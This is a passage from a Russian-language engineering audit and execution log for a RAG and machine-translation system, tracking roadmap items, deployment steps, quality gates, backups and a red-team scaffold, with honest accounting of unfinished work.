| 11 | Иерархический поиск | завершен (NO-GO) | Реранкер оставил итог без изменений; допустим только эксперимент с маршрутизацией по родителю и листьями в цитатах |
| 12 | Бюджет контекста и проверка цитат | частичный GO | Бюджет принят (но живет в окружении, см. § 4.7); проверка цитат — **повтор по § 5.3** |
| 13 | Память переводов | не начат | Кода нет. **Рецепт по § 5.5:** подтвержденные правки как пары памяти, поиск ближайших через существующий гибрид, стопроцентные совпадения мимо модели |
| 14 | Защита чисел, единиц, стандартов | не начат | Кода нет. **Приоритет P1 по § 5.2** — прямой рычаг слабейшей метрики |
| 15 | Дообучение Hy-MT2 | отложен | 9 правок при пороге 1000–3000; зависит от пункта 13 |
| 16 | Разделение очередей | в работе | Есть только очередь бокового контура извлечения; постановщик заявок не подключен; основные этапы в одной очереди |
| 17 | systemd | не начат | Процессы в tmux; из-за этого боевые флаги незакреплены (§ 4.7) — решать совместно |
| 18 | Наблюдаемость и SLO | не начат | Только базовый скрейп публичной метрики; нужны метрики `vLLM` (время до первого токена, между токенами, занятость кэша), GPU через DCGM, глубина очередей, продуктовые задержки |
| 19 | Фронтенд | в работе | Устранены ошибки линтера; ленивой загрузки, сквозных тестов и проверки доступности нет — писать на `Playwright` плюс проверка доступности |
| 20 | Состязательная проверка и модели | исследование | **Развернуть стенд по § 5.6** |

Слабые сегменты базовой линии, требующие явных задач (сейчас распределены по
пунктам): китайская отвечаемость $0{,}8148$ (потеря в генерации, не в поиске);
междокументные вопросы $0{,}8362$ (просаживается и поиск); точность чисел
$0{,}2297$; семантическая поддержка цитат $0{,}1776$. На первые две влияет
многозапросная параллельная декомпозиция в цикле агента (сокращает и число
итераций, и давление на окно контекста), на последние две — пункты 14 и 12.

## 8. Рекомендуемый порядок исполнения

1. **Безопасность контура доступа (§ 3).** Обход чтения файлов; сид-администратор
   и его пароль из репозитория и Keycloak; закрытие административной консоли
   снаружи; отключение парольного grant. Решение о темпе — за владельцем, но эти
   пункты предшествуют модельным экспериментам.
2. **Устойчивость статусов документа (§ 4.1, 4.2).** Сторож зависших статусов и
   перезахват ревизии; исправление бесшумной потери перезапуска перевода.
3. **Закрепление боевых флагов (§ 4.7)** — вместе с переводом процессов под
   systemd (пункт 17).
4. **Обновление vLLM до версии не ниже 0.24 (§ 5.1)** — закрывает удаленный отказ
   в обслуживании мультимодальной модели.
5. **Качество перевода и экспорта (§ 4.3, 4.4)** — граница слова в проверке
   стандартов; порча гиперссылок.
6. **Детерминированная защита чисел и единиц (§ 5.2, пункт 14)** — главный рычаг
   слабейшей метрики.
7. **Повторная квалификация проверки цитат (§ 5.3) и лексического поиска
   (§ 5.4)** — по исправленным методологиям.
8. **Резервное копирование и стенд состязательной проверки (§ 5.6, пункты 3, 20).**
9. **Эксплуатационные пункты (§ 7):** разделение очередей, наблюдаемость,
   фронтенд-долги, память переводов.
10. **Синхронизация документации (§ 6)** — параллельно, малыми правками; при любой
    правке `CLAUDE.md` зеркалить в `AGENTS.md`.

## 9. Формат отчетности

Каждый пункт ведется в `docs/roadmap.md` по прежней схеме
«Plan → Act → Verify → Report». Технология принимается только по воспроизводимым
замерам DocRAGenslate, а не по публичному рейтингу или заявлению разработчика.
Публичные результаты используются для отбора кандидатов. Изменения кода и
конфигурации проходят полный цикл выпуска; production не изменяется без окна
обслуживания, теневого прогона и отката.

## 10. Журнал исполнения после аудита

### 10.1. Текущий итог

Основной пакет исправлений и эксплуатационных scaffold-контуров реализован в
коммите `994f4ca` (`feat: implement July reliability and quality plan`). После
него отдельными проверенными выпусками закреплены runtime-роли базы, безопасное
формирование окружения `systemd`, перенос API/воркеров из `tmux`, исправление
startup-контекста профильных ARQ-воркеров и включение раздельной маршрутизации
очередей. Текущая проверенная вершина функциональных изменений — `8b3e580`;
все перечисленные коммиты отправлены в `origin/main`.

По строгому счету исходных 20 пунктов полностью приняты **14**, незавершены
**5**, а пункт 3 (§ 3/P0-security) исключен владельцем из текущего цикла.

Это **не означает завершение всего плана**. Перенос прикладных процессов на
`systemd` и staged cutover очередей завершены, но полный переход модельного
стека на `vLLM >= 0.24`, квалификация новых контуров качества, полноценное
резервное копирование и реальный red-team-прогон на одноразовом стенде еще не
завершены.

### 10.2. Подтвержденные действия и проверки

| Область | Act | Verify | Текущая трактовка |
| --- | --- | --- | --- |
| Код и история | Реализация начата в `994f4ca`; последующие проверенные блоки доведены до `8b3e580` | Каждый принятый блок после профильных тестов отправлен в `origin/main`; пользовательская правка `.serena/project.yml` в коммиты не включалась | Код зафиксирован; это не равнозначно полному production-выпуску всех контуров |
| Локальный контур | Запущены backend и frontend проверки | Текущая отслеживаемая вершина: `pytest` **937 passed, 1 skipped**; Playwright **10/10** | Локальный шлюз зеленый; один пропуск остается явно видимым |
| A100 | Код доставлен, миграция `0028` применена и выполнен серверный прогон | Ранее полный `pytest`: **900 passed, 1 skipped**; после `0028` еще **45/45** профильных тестов; API, exporter и четыре split-worker активны | Серверная совместимость новых RAG/chat-изменений подтверждена; отдельные GPU-квалификации перечислены ниже |
| База и RLS | Применена миграция `0027` памяти переводов; добавлена RLS-защита новой таблицы и рабочие runtime-роли | Миграция и RLS проверены на A100 | Этот этап выпущен. Он относится к разграничению данных и не закрывает исключенные дефекты § 3 |
| Предрелизная страховка | Перед выпуском базы создан dump | Наличие dump проверено перед изменением | **Не считать резервным копированием:** нет отдельного носителя, расписания, WAL-контура и restore drill |
| `systemd` | API, legacy-drain worker, четыре профильных worker и exporter метрик перенесены из `tmux` в units с отдельными runtime-ролями БД | После повторного рестарта все семь units `active`; `/healthz=ok`; tmux-процессы API/worker отсутствуют; production-конфигурация и auth сохранены | **Выпущено:** откат описан, общие секреты владельца схемы в процессы приложения не передаются |
| Разделение очередей | После canary и исправления явных ARQ-настроек включен `RAG_QUEUE_ROLLOUT_MODE=split` (`b81a6e2`) | API-процесс видит `split`; fake-UUID parse canary прошел без изменения БД; `arq:queue`, четыре профильные очереди и DLQ после cutover пусты; журналы без warning | **Выпущено:** legacy worker оставлен только для безопасного drain ранее поставленных задач |
| `vLLM >= 0.24` | Квалифицированы Hy-MT2, Qwen3.5, текстовый и визуальный эмбеддеры; native pooling реранкера отклонен, официальный direct scoring квалифицирован отдельно | Qwen3.5 `:8006`, Hy-MT2 `:8005` и visual embedding `:8007` уже переведены на immutable vLLM **0.24.0**, профильные smoke/Prometheus/NRestarts чисты. Direct reranker: 169 Gold-кейсов, top-1/recall@3/MRR = **1,0** | **Три production-профиля выпущены.** GPU4 embedding/direct-reranker остаются отдельным окном после BM25; native pooling не использовать |
| Надежность § 4.1–4.8 | Выполнен отдельный synthetic-only интеграционный smoke после systemd/split cutover | 68 профильных тестов; recovery cron после реального рестарта; два уникальных fake-UUID re-export job; exact-prefix MinIO create/remove; flags из `/proc`; все units/очереди/health чисты | **Принято:** пользовательские документы и 36 исторических orphan-префиксов не изменялись |
| Числа и память переводов | Исправлено сохранение знака; TM прошла disposable candidate→approve→exact→revoke и переведена в production `enforce` только для approved exact-совпадений; nearest отключен (`top_k=0`); финальный RAG-ответ получил aggregate-only quantity/unit guard `shadow` | Exact проходит повторную проверку чисел/стандартов и при несоответствии возвращается к модели; локально и A100 **25/25** профильных тестов; runtime readback двух worker: `enforce`, `top_k=0`, `NRestarts=0`; таблица TM перед включением пуста. RAG guard fail-open, RU/EN/ZH и `-16,5 MPa` покрыты; Prometheus-счетчики live | **Пункт 13 принят в exact-only режиме.** Ближайшие примеры остаются отключены до накопления данных; quantity guard остается `shadow` до приватной 236-case квалификации |
| Веб-smoke | Добавлены мобильные выбор области/истории, multi-document scope, полноширинная компоновка viewer, устойчивый к длинным идентификаторам editor и восстановление запроса после ошибки табличной экстракции; SPA доставлен на A100 | Playwright **10/10**; editor проверяет точное PATCH-тело, touch targets ≥44 px, возврат и отсутствие overflow 390→562 px; table-сценарий проверяет progress, широкую таблицу, XLSX, точные API-тела, 422 и немедленный retry; production shell на 390 px без переполнения. Синтетический production-smoke viewer отложен до освобождения GPU5, чтобы не искажать BM25 | **Чат и table UX выпущены; адаптивные viewer/editor доставлены.** Финальная приемка — короткий синтетический production-smoke после BM25 |
| Наблюдаемость | Prometheus/Grafana и Postgres/Redis/MinIO/model targets развернуты; bootstrap переведен на least-privilege роль | Targets приложения, очередей, БД, хранилища и моделей UP; 11/11 rules загружены; DCGM недоступен внутри непривилегированного LXC | **Принято без GPU-exporter:** DCGM требует host-level подключения и не блокирует продуктовые работы |
| Red-team | Scaffold усилен fail-closed проверками и закреплен в `dc4be03`; Promptfoo `0.120.19` pinned | Offline mock: **8/8**; Python-контракты: **20/20** совместно с deploy-проверками; Node-контракт и синтаксис чисты; evidence `0600` | **Mock-контур принят; реальная проверка не выполнена:** требуется одноразовый изолированный стенд, не production |

### 10.3. Статус блоков плана

| Блок | Статус на текущий момент | Что еще требуется для приемки |
| --- | --- | --- |
| § 4.1–4.2, устойчивость статусов и повторных задач | **Принято и выпущено** | Recovery после реального systemd-рестарта и два независимых fake-UUID re-export job подтверждены; дальнейшая работа — обычное наблюдение SLO |
| § 4.3–4.6, корректность стандартов, DOCX, области рисунков и XLSX | **Принято по профильным регрессиям и synthetic smoke** | Реальные пользовательские документы намеренно не переэкспортировались; дальнейшая проверка идет на новых штатных заданиях |
| § 4.7 и пункт 17, закрепление флагов/systemd | **Выпущено** | Поддерживать tracked runtime-профиль и unit-runbook при следующих изменениях; документный smoke остается общим финальным шлюзом |
| § 4.8, эксплуатационные локальные исправления | **Принято на synthetic-only smoke** | 36 найденных production orphan-префиксов не удалять до отдельной копии/проверки возраста; новый synthetic prefix удален exact-prefix операцией без побочных изменений |
| § 5.1, `vLLM >= 0.24` | **Qwen3.5, Hy-MT2 и visual embedding выпущены на 0.24; GPU4-контур ожидает завершения BM25** | Отдельно переключить GPU4 embedding/direct-reranker и выполнить итоговый межсервисный smoke |
| § 5.2, числовой и сущностный gate | **Translation entity guard и RAG quantity guard выпущены в `shadow`; знаковые величины исправлены** | Накопить приватные агрегаты на 236-case генерационном прогоне и реальном потоке; решение GO/NO-GO до любого изменения ответа |
| § 5.3, селективная проверка цитат | **Локальная модельная квалификация завершена NO-GO; production выключен** | На 236 Gold HHEM и Lettuce не дали общего EN/RU/ZH порога: HHEM ZH максимум 0,840 answerability при precision 0,943; Lettuce слаб на EN/ZH. Следующий шлюз — generated-answer shadow baseline и отдельная RU-модель/дообучение |
| § 5.4, повтор BM25 | **Чистый A100-прогон выполняется на direct FP32/one-pair runtime** | `8b3e580` заменил избыточный hardcode 21 replay на tracked policy minimum 3 с fail-closed диапазоном 3–21; raw-score drift не используется, решение только по rank-consensus и полным quality/load gates |
| Пункт 13, память переводов | **Принято и выпущено: production exact-only `enforce`, nearest `top_k=0`** | Накопить утвержденные пользовательские правки и hit-метрики; nearest-примеры не включать без отдельной оценки |
| Пункт 15, дообучение Hy-MT2 | **Завершен с NO-GO по недостатку данных** | Production содержит 9 версий правок, 5 уникальных сегментов, 3 документа и 2 редакторов; approved-пар TM пока 0. Это на два порядка ниже минимального шлюза 1000–3000 проверенных пар. Текущую пользу дает exact-only TM; fine-tuning переоткрывать только после достижения порога |
| Пункт 16, разделение очередей | **Выпущено в режиме `split`** | Наблюдать глубину очередей и DLQ; удалить legacy-drain worker только после достаточного периода без старых заданий |
| Пункт 18, наблюдаемость и SLO | **Live targets, alerts и dashboards развернуты** | GPU/DCGM подключать на уровне host при появлении доступа; продолжать собирать продуктовые SLO |
| Пункт 19, фронтенд | **Мобильная область чата, multi-document scope, адаптивные viewer/editor и recoverable table extraction реализованы; Playwright 10/10** | Production Playwright MCP: `/chat` 390/390 px, «Таблица» 103,5×44 px, console error/warning 0. После освобождения GPU5 выполнить viewer/editor smoke на одноразовом синтетическом документе и удалить его |
| § 5.6, резервные копии | **DB-only restore drill PASS; долговременная копия не развернута** | Dump восстановлен в изолированный PostgreSQL: 14 документов, 2038 сегментов, 294 чанка, потерянных связей 0. Для приемки нужен host-level отдельный mount, pgBackRest/WAL, versioned MinIO mirror, Keycloak export и полный повторный drill |
| § 5.6 / пункт 20, red-team | **Fail-closed scaffold и offline mock приняты** | Изолированный стенд, тестовые документы/canary, реальный запуск набора и отчет с устранением подтвержденных находок |
| § 3, P0-security контура доступа | **Исключен владельцем из текущего цикла; не изменялся** | Все находки § 3 остаются открытыми и не должны считаться закрытыми изменениями RLS, systemd или red-team scaffold |

### 10.4. Следующие выпускные шлюзы

1. Доквалифицировать профили `vLLM 0.24`; успешный smoke Hy-MT2 является только
   первым кандидатом, а не основанием объявлять обновленным весь стек.
2. Выполнить измеримые квалификации числового gate, селективных цитат, BM25 и
   памяти переводов; до решения GO соответствующие режимы не переводить в
   `enforce`.
3. Развернуть live monitoring targets/alerts/dashboard и подтвердить SLO на
   фактических метриках после split-cutover.
4. Предоставить отдельный backup mount, включить расписание и выполнить restore
   drill. Предрелизный dump хранить только как точечную страховку выпуска.
5. Развернуть одноразовый изолированный red-team стенд и зафиксировать реальный
   результат; offline mock не считать доказательством безопасности production.
6. Не удалять 36 исторических MinIO orphan-префиксов до отдельной копии и
   доказательства срока/происхождения; synthetic exact-prefix cleanup уже принят.
7. После каждого фактического выпуска дополнять этот раздел и журнал
   `docs/roadmap.md`, не повышая статус по наличию кода или scaffold без проверки.
